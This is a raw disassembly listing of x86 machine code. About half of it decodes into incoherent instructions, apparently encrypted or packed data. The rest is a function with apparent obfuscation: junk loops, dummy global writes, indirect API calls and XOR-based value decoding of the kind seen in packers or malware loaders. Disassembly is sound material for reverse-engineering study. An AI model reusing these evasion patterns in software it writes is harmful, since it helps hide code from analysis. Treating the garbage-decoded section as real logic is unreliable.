  408ca7:	scas   al,BYTE PTR es:[edi]
  408ca8:	push   cs
  408ca9:	jmp    0x408cd8
  408cab:	es xchg edx,eax
  408cad:	push   cs
  408cae:	out    dx,eax
  408caf:	sbb    cl,0x19
  408cb2:	scas   al,BYTE PTR es:[edi]
  408cb3:	jg     0x408d24
  408cb5:	dec    eax
  408cb6:	bnd jno 0x408cbc
  408cb9:	test   al,0x40
  408cbb:	mov    dl,0x37
  408cbd:	arpl   WORD PTR [esi+ecx*4+0x7d],di
  408cc1:	neg    DWORD PTR [eax+0x7c]
  408cc4:	and    al,0x30
  408cc6:	mov    ebx,0x5e063f03
  408ccb:	jecxz  0x408cb1
  408ccd:	cmp    BYTE PTR [eax-0x4e42508],bl
  408cd3:	inc    ecx
  408cd4:	xor    BYTE PTR [edi-0x4e13a6f2],ch
  408cda:	outs   dx,BYTE PTR ds:[esi]
  408cdb:	and    al,BYTE PTR [eax]
  408cdd:	sub    dh,bl
  408cdf:	sub    al,cl
  408ce1:	dec    eax
  408ce2:	push   cs
  408ce3:	scas   al,BYTE PTR es:[edi]
  408ce4:	inc    ebx
  408ce5:	sbb    edx,DWORD PTR [edx-0x60]
  408ce8:	sbb    ecx,DWORD PTR [eax-0x5ee9474b]
  408cee:	xchg   BYTE PTR [di],ah
  408cf1:	sbb    al,0xb5
  408cf3:	and    al,0x38
  408cf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cf6:	(bad)  
  408cf7:	lsl    esp,WORD PTR [edi-0x7fd65a68]
  408cfe:	call   0x7a5b:0xa64074c7
  408d05:	jmp    0x50cf7b2c
  408d0a:	sbb    DWORD PTR [edi+0x4092f095],esp
  408d10:	mov    ebp,0xf7daf4f
  408d15:	xchg   edx,eax
  408d16:	mov    eax,0xd56bf064
  408d1b:	ret    
  408d1c:	rcr    DWORD PTR [eax],1
  408d1e:	lods   al,BYTE PTR ds:[esi]
  408d1f:	sahf   
  408d20:	ret    0xbd55
  408d23:	and    DWORD PTR [esi+0x24febd20],esp
  408d29:	outs   dx,BYTE PTR ds:[esi]
  408d2a:	add    al,0xf7
  408d2c:	push   cs
  408d2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d2e:	iret   
  408d2f:	cmp    DWORD PTR [ebx],ecx
  408d31:	pop    ebp
  408d32:	dec    edx
  408d33:	ffreep st(1)
  408d35:	push   0x49a729aa
  408d3a:	nop
  408d3b:	mov    ebx,esi
  408d3d:	in     eax,0x73
  408d3f:	outs   dx,DWORD PTR ds:[esi]
  408d40:	jo     0x408cdf
  408d42:	jmp    0x97cac22d
  408d47:	(bad)  
  408d49:	inc    ebp
  408d4a:	xchg   esp,eax
  408d4b:	mov    ds:0x5478c558,eax
  408d50:	adc    ebp,DWORD PTR [esi+ebx*4-0x3ed78996]
  408d57:	aam    0x1b
  408d59:	xor    al,0x5f
  408d5b:	rep outs dx,DWORD PTR ds:[esi]
  408d5d:	loopne 0x408d78
  408d5f:	pop    esp
  408d60:	das    
  408d61:	push   ebp
  408d62:	sub    dh,BYTE PTR [eax-0x3178be2]
  408d68:	or     DWORD PTR [edx],ebx
  408d6a:	arpl   WORD PTR [esi],bx
  408d6c:	mov    ecx,0xc689591b
  408d71:	lock add dl,BYTE PTR [ebx+eax*1]
  408d75:	ss bnd jae 0x408d7c
  408d79:	xlat   BYTE PTR ds:[ebx]
  408d7a:	mov    edi,DWORD PTR [ebp-0x8]
  408d7d:	lea    edx,[edx+edi*1+0x32729b]
  408d84:	mov    DWORD PTR [ebp-0x8],edx
  408d87:	mov    edx,DWORD PTR [ebp-0x20]
  408d8a:	xor    edx,eax
  408d8c:	mov    edi,0xffcd8d65
  408d91:	sub    edi,edx
  408d93:	add    edi,DWORD PTR [ebp-0x10]
  408d96:	mov    edx,DWORD PTR [ebp-0x20]
  408d99:	jmp    0x408f4a
  408d9e:	adc    BYTE PTR [esi],cl
  408da0:	das    
  408da1:	test   eax,0xb790a931
  408da6:	xor    al,0xa9
  408da8:	mov    ch,0xa
  408daa:	sahf   
  408dab:	ins    DWORD PTR es:[edi],dx
  408dac:	clc    
  408dad:	mov    ds:0x7e7ed1b1,al
  408db2:	mov    bh,BYTE PTR [edi+0x7e]
  408db5:	jle    0x408dfe
  408db7:	pop    edi
  408db8:	push   edx
  408db9:	cmp    dh,al
  408dbb:	pushf  
  408dbc:	cmp    al,0xcb
  408dbe:	and    eax,0x3a75f256
  408dc3:	mov    eax,ds:0x8a5ee77f
  408dc8:	push   ebx
  408dc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dca:	and    DWORD PTR [esi],esi
  408dcc:	aam    0x40
  408dce:	bound  esi,QWORD PTR [esi]
  408dd0:	in     al,dx
  408dd1:	(bad)  
  408dd3:	clc    
  408dd4:	xchg   ecx,eax
  408dd5:	add    al,0xd8
  408dd7:	out    dx,eax
  408dd8:	fadd   QWORD PTR ds:0xe8042afc
  408dde:	inc    edx
  408ddf:	add    DWORD PTR [ebp+0x2d],ecx
  408de2:	push   ss
  408de3:	iret   
  408de4:	pop    ds
  408de5:	in     eax,dx
  408de6:	push   esp
  408de7:	adc    DWORD PTR [esi],0x5c
  408dea:	sub    al,0x80
  408dec:	test   al,0xa6
  408dee:	inc    ecx
  408def:	gs aad 0xd
  408df2:	jae    0x408da9
  408df4:	mov    DWORD PTR [edi+0xd],0x6537b1c5
  408dfb:	retf   
  408dfc:	or     DWORD PTR [ebp-0x72aeaa80],ecx
  408e02:	mov    dl,0x1b
  408e04:	loop   0x408dea
  408e06:	and    edi,DWORD PTR ds:0x1843808d
  408e0c:	cmc    
  408e0d:	jnp    0x408e5a
  408e0f:	adc    al,0x7e
  408e11:	xor    bl,dl
  408e13:	iret   
  408e14:	and    DWORD PTR [ecx-0x4d97fa17],ebx
  408e1a:	ror    BYTE PTR [ecx+0x37],0x1
  408e1e:	xchg   edx,eax
  408e1f:	adc    BYTE PTR [ecx-0x3e],dl
  408e22:	out    0xcd,al
  408e24:	dec    esp
  408e25:	rcl    DWORD PTR [edx-0x43],0x62
  408e29:	out    dx,eax
  408e2a:	outs   dx,DWORD PTR ds:[esi]
  408e2b:	push   esi
  408e2c:	cmp    edx,DWORD PTR [ecx-0x38c8f9bf]
  408e32:	int    0xd5
  408e34:	and    ch,BYTE PTR [edi+edx*2]
  408e37:	fcom   QWORD PTR [ebx-0x36a0a49f]
  408e3d:	js     0x408eb2
  408e3f:	fsubr  DWORD PTR [ebp-0x1fa8836a]
  408e45:	nop
  408e46:	clc    
  408e47:	cs mov edx,ebx
  408e4a:	jmp    FWORD PTR [eax-0x47316fcd]
  408e50:	jmp    0x3cfa0da4
  408e55:	xor    esp,ebp
  408e57:	jnp    0x408e3b
  408e59:	cld    
  408e5a:	cmp    ch,BYTE PTR [ebp-0x3e]
  408e5d:	dec    ebp
  408e5e:	mov    ah,0x91
  408e60:	lea    esi,[esi-0x18]
  408e63:	jmp    0x49c5:0xf603b60b
  408e6a:	ins    DWORD PTR es:[edi],dx
  408e6b:	ins    BYTE PTR es:[edi],dx
  408e6c:	loope  0x408e04
  408e6e:	imul   eax
  408e70:	push   esp
  408e71:	addr16 dec esp
  408e73:	jo     0x408e28
  408e75:	loopne 0x408ef0
  408e77:	cmp    BYTE PTR [edx+0x2c],cl
  408e7a:	bound  esi,QWORD PTR [esi+0x1656ee58]
  408e80:	lds    edx,FWORD PTR [ecx-0x4a]
  408e83:	cdq    
  408e84:	push   ecx
  408e85:	outs   dx,BYTE PTR ds:[esi]
  408e86:	leave  
  408e87:	sbb    edx,DWORD PTR [ecx+0x30f5229d]
  408e8d:	in     eax,dx
  408e8e:	outs   dx,DWORD PTR ds:[esi]
  408e8f:	clc    
  408e90:	mov    esp,0x188a7b1f
  408e95:	push   eax
  408e96:	mov    WORD PTR [ebx+0x1d183083],cs
  408e9c:	mov    bl,0x51
  408e9e:	cmp    eax,0x6dd8e261
  408ea3:	fwait
  408ea4:	int    0x7a
  408ea6:	adc    ch,BYTE PTR [edx+edi*4-0x6a]
  408eaa:	test   al,ch
  408eac:	xchg   esi,eax
  408ead:	in     al,dx
  408eae:	mov    ch,BYTE PTR [esi]
  408eb0:	push   esi
  408eb1:	pop    edx
  408eb2:	sets   BYTE PTR [edi]
  408eb5:	cmc    
  408eb6:	pop    edi
  408eb7:	(bad)  
  408eb9:	add    DWORD PTR [ebx-0x7e789b92],ecx
  408ebf:	(bad)  
  408ec0:	mov    ds:0x8e96726f,al
  408ec5:	neg    BYTE PTR [ebp+0x65]
  408ec8:	sbb    BYTE PTR [ebx+0x16],bl
  408ecb:	xchg   esp,eax
  408ecc:	sub    DWORD PTR [edi],ebx
  408ece:	push   cs
  408ecf:	xchg   ecx,eax
  408ed0:	pop    eax
  408ed1:	xor    al,BYTE PTR [edx+0x35]
  408ed4:	push   edi
  408ed5:	add    al,0x1e
  408ed7:	std    
  408ed8:	and    BYTE PTR [ebp-0x39],0xf7
  408edc:	add    al,0x24
  408ede:	scas   al,BYTE PTR es:[edi]
  408edf:	out    0x7b,al
  408ee1:	hlt    
  408ee2:	jns    0x408eac
  408ee4:	cli    
  408ee5:	add    al,BYTE PTR [ebp+0x4f]
  408ee8:	dec    ebp
  408ee9:	bound  eax,QWORD PTR [ebp+0x69]
  408eec:	xor    eax,0x70493d0e
  408ef1:	popa   
  408ef2:	arpl   WORD PTR [ebp+0x72],cx
  408ef5:	pushf  
  408ef6:	or     eax,0xebaa2251
  408efb:	or     dl,ch
  408efd:	mov    dh,0xe0
  408eff:	xchg   ecx,eax
  408f00:	std    
  408f01:	enter  0x8dc6,0x5b
  408f05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f06:	gs jb  0x408f51
  408f09:	mov    edi,0xca44a3f6
  408f0e:	pop    ecx
  408f0f:	popa   
  408f10:	mov    ds,WORD PTR [eax]
  408f12:	inc    ebp
  408f13:	mov    ?,WORD PTR [edx-0x6a]
  408f16:	lods   eax,DWORD PTR ds:[esi]
  408f17:	cmp    DWORD PTR [ebx+0x467a1f5e],ecx
  408f1d:	jo     0x408f97
  408f1f:	(bad)  
  408f21:	scas   al,BYTE PTR es:[edi]
  408f22:	in     eax,0xa0
  408f24:	dec    edi
  408f25:	or     edx,DWORD PTR [ebx-0x44]
  408f28:	xor    DWORD PTR [edi],esp
  408f2a:	push   ds
  408f2b:	rcr    DWORD PTR [edi],0x56
  408f2e:	ins    BYTE PTR es:[edi],dx
  408f2f:	add    DWORD PTR ds:0x714e32d0,ecx
  408f35:	std    
  408f36:	rol    BYTE PTR [ebp+edi*1-0x3e0f0207],cl
  408f3d:	inc    ecx
  408f3e:	in     eax,0xc1
  408f40:	mov    edi,0x8d4d6241
  408f45:	gs jl  0x408f15
  408f48:	outs   dx,DWORD PTR ds:[esi]
  408f49:	mov    cl,0x8b
  408f4b:	pop    ebp
  408f4c:	clc    
  408f4d:	xor    edx,eax
  408f4f:	jmp    0x409100
  408f54:	or     al,0x6
  408f56:	addr16 into 
  408f58:	jne    0x408fc9
  408f5a:	mov    ch,0xc4
  408f5c:	mov    dl,0x4d
  408f5e:	(bad)  
  408f60:	int3   
  408f61:	loop   0x408f6f
  408f63:	cmp    cl,ch
  408f65:	fistp  QWORD PTR [esi+0x7e]
  408f68:	mov    bh,BYTE PTR [edi+0x7e]
  408f6b:	jle    0x408f46
  408f6d:	sbb    DWORD PTR [ebx],edx
  408f6f:	fiadd  DWORD PTR [eax]
  408f71:	xor    al,0x4d
  408f73:	cs xchg edi,eax
  408f75:	fcmovu st,st(1)
  408f77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f78:	pop    ebx
  408f79:	mov    ds:0x8c2ed332,al
  408f7e:	adc    eax,0xd60c6f43
  408f83:	cld    
  408f84:	xchg   cl,al
  408f86:	sahf   
  408f87:	mov    ecx,0xcc653ec4
  408f8c:	push   ecx
  408f8d:	fadd   DWORD PTR ss:[eax+0x312687ec]
  408f94:	or     DWORD PTR [eax+0x20a6e1ca],ebp
  408f9a:	ret    0x6e3c
  408f9d:	dec    ebx
  408f9e:	lea    ebx,[ebx+0x4ed870f9]
  408fa4:	push   ss
  408fa5:	or     dl,BYTE PTR [ebx-0x7]
  408fa8:	cmp    al,0x3f
  408faa:	sub    BYTE PTR [edx+0x7d],bl
  408fad:	cmp    ch,bl
  408faf:	add    BYTE PTR [edx],bh
  408fb1:	push   0xffffff94
  408fb3:	xchg   esp,eax
  408fb4:	xchg   esi,eax
  408fb5:	daa    
  408fb6:	fs jne 0x408fa6
  408fb9:	dec    edi
  408fba:	inc    edi
  408fbb:	pop    es
  408fbc:	xchg   ebp,eax
  408fbd:	idiv   BYTE PTR [eax-0x2e]
  408fc0:	clc    
  408fc1:	scas   al,BYTE PTR es:[edi]
  408fc2:	mov    esp,0x57c880a4
  408fc7:	(bad)  
  408fc8:	sub    bh,BYTE PTR [ebp-0x74ba9d5b]
  408fce:	repnz enter 0x25fd,0xbc
  408fd3:	test   eax,0x4d547cfa
  408fd8:	fcmove st,st(0)
  408fda:	xor    ecx,ebx
  408fdc:	ins    BYTE PTR es:[edi],dx
  408fdd:	int    0x51
  408fdf:	mov    dh,0xc8
  408fe1:	inc    edi
  408fe2:	sub    eax,0x601e1a13
  408fe7:	and    esi,ecx
  408fe9:	ss jle 0x408fe8
  408fec:	test   eax,0xee6b742c
  408ff1:	jo     0x408fc4
  408ff3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ff4:	xchg   esi,eax
  408ff5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ff6:	xor    dh,BYTE PTR [edi-0x2578a415]
  408ffc:	mov    ch,0x7d
  408ffe:	mov    ebp,0xdbc75c6c
  409003:	sbb    DWORD PTR [edx],ecx
  409005:	popa   
  409006:	mov    dh,0x25
  409008:	popa   
  409009:	push   ebx
  40900a:	mov    ebx,0x1bbf313
  40900f:	gs xchg esp,eax
  409011:	sub    DWORD PTR [edi-0xa6082c9],ebx
  409017:	scas   eax,DWORD PTR es:[edi]
  409018:	int    0x4b
  40901a:	mov    edx,0x8e8f7c4c
  40901f:	gs or  cl,ah
  409022:	(bad)  
  409023:	fst    QWORD PTR [edi-0x7862539c]
  409029:	stos   BYTE PTR es:[edi],al
  40902a:	mov    edi,0xfc11832a
  40902f:	leave  
  409030:	retf   
  409031:	in     eax,dx
  409032:	xchg   ecx,eax
  409033:	pop    ebx
  409034:	test   edi,edx
  409036:	mov    bh,BYTE PTR [edi]
  409038:	push   es
  409039:	outs   dx,DWORD PTR ds:[esi]
  40903a:	enter  0xdafd,0x1f
  40903e:	cmp    ch,BYTE PTR [edi+eiz*2]
  409041:	mov    edi,0xfaaf1696
  409046:	dec    edx
  409047:	push   0xffffffb0
  409049:	out    0x83,eax
  40904b:	(bad)
  40904e:	ins    DWORD PTR es:[edi],dx
  40904f:	loope  0x4090b0
  409051:	jo     0x408ff7
  409053:	xchg   edi,eax
  409054:	jo     0x409031
  409056:	daa    
  409057:	pop    edi
  409058:	mov    dl,0x27
  40905a:	daa    
  40905b:	xchg   ebx,eax
  40905c:	pop    edx
  40905d:	dec    ebp
  40905e:	outs   dx,BYTE PTR ds:[esi]
  40905f:	mov    BYTE PTR [esi+0x66],cl
  409062:	sub    al,0x68
  409064:	adc    eax,0xfca5fdaf
  409069:	sbb    al,BYTE PTR [ecx+0x426688e0]
  40906f:	dec    esi
  409070:	inc    edx
  409071:	lods   eax,DWORD PTR ss:[esi]
  409073:	dec    ecx
  409074:	shr    DWORD PTR [ecx-0x6d929bc],cl
  40907a:	sub    eax,0xf729b9e2
  40907f:	out    dx,al
  409080:	adc    al,0x36
  409082:	lods   eax,DWORD PTR ds:[esi]
  409083:	lea    esi,[esi+0x5]
  409086:	fwait
  409087:	into   
  409088:	sub    DWORD PTR [esi-0x20],0xf9fc8e9
  40908f:	cmp    BYTE PTR [esi-0x25f87b14],ch
  409095:	les    ecx,FWORD PTR [ecx+ebx*2]
  409098:	mov    ebp,0xe2d88db3
  40909d:	inc    ebp
  40909e:	rol    DWORD PTR [ecx-0x69cdd9dc],cl
  4090a4:	dec    ecx
  4090a5:	xchg   esp,eax
  4090a6:	(bad)  
  4090a7:	jg     0x40911b
  4090a9:	lods   eax,DWORD PTR ds:[esi]
  4090aa:	mov    eax,ds:0x8d940e37
  4090af:	pop    ss
  4090b0:	and    dl,BYTE PTR [esi]
  4090b2:	mov    DWORD PTR [edx+0x1334d60b],edx
  4090b8:	movzx  edx,BYTE PTR [ebx]
  4090bb:	mov    dl,0xc8
  4090bd:	clc    
  4090be:	or     bl,al
  4090c0:	sbb    eax,0xca6e3ce7
  4090c5:	leave  
  4090c6:	sub    eax,0x674c884f
  4090cb:	je     0x409117
  4090cd:	mov    ds:0x7e1221fc,eax
  4090d2:	dec    edx
  4090d3:	stc    
  4090d4:	int3   
  4090d5:	mov    dh,0x4b
  4090d7:	mov    ch,0xca
  4090d9:	or     dl,BYTE PTR cs:[ebp+0x70]
  4090dd:	add    ch,BYTE PTR [edi+0x4ac4c7b3]
  4090e3:	mov    cl,0x6e
  4090e5:	test   edx,ebp
  4090e7:	and    dh,BYTE PTR [eax-0x653c2a15]
  4090ed:	dec    edi
  4090ee:	fsubr  QWORD PTR [ecx]
  4090f0:	sub    al,0xa2
  4090f2:	push   0x67a804be
  4090f7:	mov    ch,al
  4090f9:	or     ecx,eax
  4090fb:	pop    eax
  4090fc:	test   eax,0x379afda
  409101:	ror    DWORD PTR [edi],1
  409103:	scas   eax,DWORD PTR es:[edi]
  409104:	sar    DWORD PTR [ebx],cl
  409106:	xlat   BYTE PTR ds:[ebx]
  409107:	jbe    0x407629
  40910d:	pop    ebx
  40910e:	pop    edi
  40910f:	leave  
  409110:	ret    0x8
  409113:	push   ebp
  409114:	mov    ebp,esp
  409116:	sub    esp,0x70
  409119:	call   DWORD PTR ds:0x42e8b7
  40911f:	and    DWORD PTR ds:0x43035b,0x4302bd
  409129:	xor    ecx,ecx
  40912b:	mov    DWORD PTR ds:0x42ec5b,0x7bf5
  409135:	cmp    eax,0x86576545
  40913a:	mov    DWORD PTR ds:0x430363,0x7971
  409144:	jne    0x409304
  40914a:	cmp    ecx,0x9879
  409150:	mov    DWORD PTR ds:0x42e658,0x1505
  40915a:	jne    0x409304
  409160:	push   0x78776563
  409165:	call   DWORD PTR ds:0x42e8f7
  40916b:	sbb    DWORD PTR ds:0x4302c1,0x4302f1
  409175:	push   0x8678976
  40917a:	or     DWORD PTR ds:0x42ec4b,0x624a
  409184:	call   DWORD PTR ds:0x42e8bf
  40918a:	adc    DWORD PTR ds:0x42e640,0x4302dd
  409194:	test   eax,eax
  409196:	je     0x4091ca
  40919c:	mov    DWORD PTR ds:0x4302d1,0x7d40
  4091a6:	push   0x87678768
  4091ab:	xor    DWORD PTR ds:0x4302b5,0x35ac
  4091b5:	push   0x86787676
  4091ba:	or     DWORD PTR ds:0x4302ed,0x42e654
  4091c4:	call   DWORD PTR ds:0x42e963
  4091ca:	push   ebx
  4091cb:	mov    ebx,0xf89c8531
  4091d0:	mov    ecx,DWORD PTR ds:0x42e648
  4091d6:	and    DWORD PTR ds:0x4302d9,ecx
  4091dc:	mov    DWORD PTR [ebp-0x8],ebx
  4091df:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4091e6:	adc    DWORD PTR ds:0x4302b9,edi
  4091ec:	lea    eax,[ebp-0x18]
  4091ef:	mov    DWORD PTR ds:0x42ec5b,0x1a
  4091f9:	cmp    DWORD PTR ds:0x42ec5b,0x0
  409200:	je     0x409235
  409206:	cmp    DWORD PTR ds:0x42ec5b,0x25
  40920d:	jne    0x409219
  409213:	call   DWORD PTR ds:0x42e863
  409219:	mov    ecx,DWORD PTR ds:0x42ec5b
  40921f:	dec    ecx
  409220:	mov    DWORD PTR ds:0x42ec5b,ecx
  409226:	jmp    0x4091f9
  40922b:	sub    DWORD PTR ds:0x42ec63,0x62aa
  409235:	mov    DWORD PTR [ebp-0x14],eax
  409238:	lea    eax,[ebp-0x1c]
  40923b:	mov    DWORD PTR [ebp-0xc],eax
  40923e:	mov    eax,ds:0x42ec5f
  409243:	sbb    eax,DWORD PTR ds:0x42ec5b
  409249:	mov    ds:0x42ec5f,eax
  40924e:	mov    eax,ds:0x4121a8
  409253:	mov    eax,DWORD PTR [eax+0x1c8]
  409259:	mov    eax,DWORD PTR [eax]
  40925b:	mov    ecx,DWORD PTR ds:0x42ec5b
  409261:	and    DWORD PTR ds:0x42e63c,ecx
  409267:	mov    ecx,DWORD PTR [ebp-0xc]
  40926a:	or     DWORD PTR ds:0x4302d5,0x430357
  409274:	push   esi
  409275:	add    DWORD PTR ds:0x42e64c,edx
  40927b:	mov    esi,0x7510854
  409280:	adc    DWORD PTR ds:0x4302d5,0x7ea6
  40928a:	xor    eax,esi
  40928c:	or     DWORD PTR ds:0x42ec4b,0x430367
  409296:	push   edi
  409297:	neg    edi
  409299:	mov    edi,0x32729b
  40929e:	sub    DWORD PTR ds:0x42ec4b,0x2aac
  4092a8:	add    eax,edi
  4092aa:	mov    DWORD PTR ds:0x4302c9,0x4315
  4092b4:	mov    DWORD PTR [ecx],eax
  4092b6:	mov    eax,0x4350
  4092bb:	mov    eax,ds:0x4123c8
  4092c0:	cmp    eax,0x23c13046
  4092c5:	mov    eax,DWORD PTR [ebp-0x4]
  4092c8:	mov    DWORD PTR ds:0x4302d9,0x50bd
  4092d2:	je     0x409332
  4092d8:	and    DWORD PTR ds:0x42ec63,edx
  4092de:	mov    ecx,DWORD PTR [ebp-0x8]
  4092e1:	add    DWORD PTR ds:0x42e648,0x3ec0
  4092eb:	xor    eax,esi
  4092ed:	add    eax,edi
  4092ef:	or     DWORD PTR ds:0x4302b5,0x6771
  4092f9:	imul   eax,ecx
  4092fc:	mov    DWORD PTR [ebp-0x8],eax
  4092ff:	jmp    0x409535
  409304:	push   0x4122bc
  409309:	call   DWORD PTR ds:0x42e87f
  40930f:	adc    DWORD PTR ds:0x42ec5f,0x42e64c
  409319:	test   eax,eax
  40931b:	je     0x4091ca
  409321:	xor    eax,eax
  409323:	mov    DWORD PTR ds:0x4302d5,0x3bf5
  40932d:	jmp    0x4098b3
  409332:	xor    eax,esi
  409334:	and    DWORD PTR ds:0x4302d1,0x0
  40933e:	jmp    0x409352
  409343:	xor    ecx,ecx
  409345:	or     ecx,DWORD PTR ds:0x4302d1
  40934b:	inc    ecx
  40934c:	mov    DWORD PTR ds:0x4302d1,ecx
  409352:	cmp    DWORD PTR ds:0x4302d1,0x1d
  409359:	jae    0x40939a
  40935f:	cmp    DWORD PTR ds:0x4302d1,0xc
  409366:	jne    0x409375
  40936c:	push   DWORD PTR [ebp-0x18]
  40936f:	call   DWORD PTR ds:0x42e867
  409375:	cmp    DWORD PTR ds:0x4302d1,0xb
  40937c:	jne    0x40938f
  409382:	mov    ecx,DWORD PTR ds:0x4302d1
  409388:	inc    ecx
  409389:	mov    DWORD PTR ds:0x4302d1,ecx
  40938f:	jmp    0x409343
  409394:	or     ecx,DWORD PTR ds:0x42ec4b
  40939a:	add    eax,edi
  40939c:	mov    ecx,DWORD PTR ds:0x42e7e7
  4093a2:	mov    ecx,DWORD PTR [ecx]
  4093a4:	adc    DWORD PTR ds:0x430353,ecx
  4093aa:	mov    ds:0x4122b8,eax
  4093af:	mov    DWORD PTR ds:0x43036b,0x17
  4093b9:	cmp    DWORD PTR ds:0x43036b,0x0
  4093c0:	je     0x409450
  4093c6:	cmp    DWORD PTR ds:0x43036b,0x3
  4093cd:	jne    0x4093df
  4093d3:	push   DWORD PTR [ebp-0x1c]
  4093d6:	push   DWORD PTR [ebp-0x24]
  4093d9:	call   DWORD PTR ds:0x42e86b
  4093df:	cmp    DWORD PTR ds:0x43036b,0x4
  4093e6:	jne    0x4093f9
  4093ec:	mov    ecx,DWORD PTR ds:0x43036b
  4093f2:	dec    ecx
  4093f3:	mov    DWORD PTR ds:0x43036b,ecx
  4093f9:	mov    ecx,DWORD PTR ds:0x43036b
  4093ff:	dec    ecx
  409400:	mov    DWORD PTR ds:0x43036b,ecx
  409406:	jmp    0x4093b9
  40940b:	mov    DWORD PTR ds:0x43035f,0x10
  409415:	cmp    DWORD PTR ds:0x43035f,0x0
  40941c:	je     0x409450
  409422:	cmp    DWORD PTR ds:0x43035f,0x1a
  409429:	jne    0x409438
  40942f:	push   DWORD PTR [ebp-0x10]
  409432:	call   DWORD PTR ds:0x42e86f
  409438:	mov    ecx,DWORD PTR ds:0x43035f
  40943e:	dec    ecx
  40943f:	mov    DWORD PTR ds:0x43035f,ecx
  409445:	jmp    0x409415
  40944a:	not    DWORD PTR ds:0x4302e1
  409450:	mov    eax,DWORD PTR [ebp-0x8]
  409453:	xor    eax,esi
  409455:	add    eax,edi
  409457:	mov    DWORD PTR ds:0x4302e9,0x16
  409461:	cmp    DWORD PTR ds:0x4302e9,0x0
  409468:	je     0x409493
  40946e:	cmp    DWORD PTR ds:0x4302e9,0x25
  409475:	jne    0x409481
  40947b:	call   DWORD PTR ds:0x42e873
  409481:	mov    ecx,DWORD PTR ds:0x4302e9
  409487:	dec    ecx
  409488:	mov    DWORD PTR ds:0x4302e9,ecx
  40948e:	jmp    0x409461
  409493:	mov    ds:0x4123c8,eax
  409498:	mov    eax,DWORD PTR [ebp-0x4]
  40949b:	and    DWORD PTR ds:0x42ec4f,0x0
  4094a5:	jmp    0x4094b7
  4094aa:	mov    ecx,DWORD PTR ds:0x42ec4f
  4094b0:	inc    ecx
  4094b1:	mov    DWORD PTR ds:0x42ec4f,ecx
  4094b7:	cmp    DWORD PTR ds:0x42ec4f,0x13
  4094be:	jae    0x4094e6
  4094c4:	cmp    DWORD PTR ds:0x42ec4f,0x21
  4094cb:	jne    0x4094e1
  4094d1:	push   0x42e77b
  4094d6:	push   0x42e725
  4094db:	call   DWORD PTR ds:0x42eaab
  4094e1:	jmp    0x4094aa
  4094e6:	mov    ecx,DWORD PTR ds:0x4122b8
  4094ec:	xor    eax,esi
  4094ee:	add    DWORD PTR ds:0x4302d1,0x1a56
  4094f8:	add    eax,edi
  4094fa:	mov    DWORD PTR ds:0x43036b,0x68f3
  409504:	cmp    ecx,eax
  409506:	mov    DWORD PTR ds:0x42ec63,0x3c82
  409510:	jne    0x409535
  409516:	sbb    DWORD PTR ds:0x4302e9,0x89e
  409520:	push   DWORD PTR [ebp-0x4]
  409523:	push   DWORD PTR [ebp-0x8]
  409526:	sbb    DWORD PTR ds:0x430363,0x4302f1
  409530:	call   0x4098b7
  409535:	mov    DWORD PTR ds:0x4302b9,0x1e
  40953f:	cmp    DWORD PTR ds:0x4302b9,0x0
  409546:	je     0x40958c
  40954c:	cmp    DWORD PTR ds:0x4302b9,0x25
  409553:	jne    0x40956c
  409559:	push   0x7778
  40955e:	push   DWORD PTR [ebp-0x14]
  409561:	push   0x42e65c
  409566:	call   DWORD PTR ds:0x42e877
  40956c:	mov    eax,ds:0x4302b9
  409571:	dec    eax
  409572:	mov    ds:0x4302b9,eax
  409577:	jmp    0x40953f
  40957c:	mov    edx,DWORD PTR ds:0x430309
  409582:	mov    eax,ds:0x430393
  409587:	sub    edx,eax
  409589:	add    edx,DWORD PTR [edx+eax*1]
  40958c:	mov    eax,ds:0x4121a8
  409591:	mov    eax,DWORD PTR [eax+0x18c]
  409597:	xor    DWORD PTR ds:0x43034f,0x75b9
  4095a1:	mov    eax,DWORD PTR [eax]
  4095a3:	sub    edx,0xc40
  4095a9:	mov    DWORD PTR [ebp-0x20],eax
  4095ac:	mov    eax,0xf89c853d
  4095b1:	xor    DWORD PTR ds:0x42e658,ecx
  4095b7:	mov    DWORD PTR [ebp-0x24],eax
  4095ba:	mov    DWORD PTR [ebp-0x24],eax
  4095bd:	add    edx,edx
  4095bf:	mov    DWORD PTR [ebp-0x24],eax
  4095c2:	mov    DWORD PTR [ebp-0xc],ebx
  4095c5:	mov    DWORD PTR [ebp-0x24],eax
  4095c8:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  4095cf:	and    DWORD PTR ds:0x4302c1,0x0
  4095d9:	xor    edx,edx
  4095db:	or     edx,DWORD PTR ds:0x4302c1
  4095e1:	inc    edx
  4095e2:	mov    DWORD PTR ds:0x4302c1,edx
  4095e8:	cmp    DWORD PTR ds:0x4302c1,0x23
  4095ef:	jne    0x40961d
  4095f5:	push   0x4d80
  4095fa:	push   DWORD PTR [ebp-0x14]
  4095fd:	push   0x820d
  409602:	push   DWORD PTR [ebp-0x14]
  409605:	push   DWORD PTR [ebp-0x1c]
  409608:	push   0x20d9
  40960d:	push   0x48e2
  409612:	push   0x42e74d
  409617:	call   DWORD PTR ds:0x42e87b
  40961d:	cmp    DWORD PTR ds:0x4302c1,0x1f
  409624:	jb     0x4095d9
  40962a:	add    ecx,0x11fe
  409630:	mov    ebx,DWORD PTR [ebp-0x8]
  409633:	and    DWORD PTR ds:0x42e648,0x0
  40963d:	mov    ecx,DWORD PTR ds:0x42e648
  409643:	inc    ecx
  409644:	mov    DWORD PTR ds:0x42e648,ecx
  40964a:	cmp    DWORD PTR ds:0x42e648,0x16
  409651:	jne    0x409672
  409657:	push   DWORD PTR [ebp-0xc]
  40965a:	push   DWORD PTR [ebp-0x14]
  40965d:	push   0x8989
  409662:	push   0x2c01
  409667:	push   0x2fc9
  40966c:	call   DWORD PTR ds:0x42eaaf
  409672:	cmp    DWORD PTR ds:0x42e648,0x14
  409679:	jb     0x40963d
  40967f:	mov    ecx,DWORD PTR [ebp-0x4]
  409682:	mov    edx,DWORD PTR [ebp-0x4]
  409685:	xor    edx,esi
  409687:	xor    ecx,esi
  409689:	add    ecx,edx
  40968b:	mov    edx,DWORD PTR [ebp-0x4]
  40968e:	xor    ebx,esi
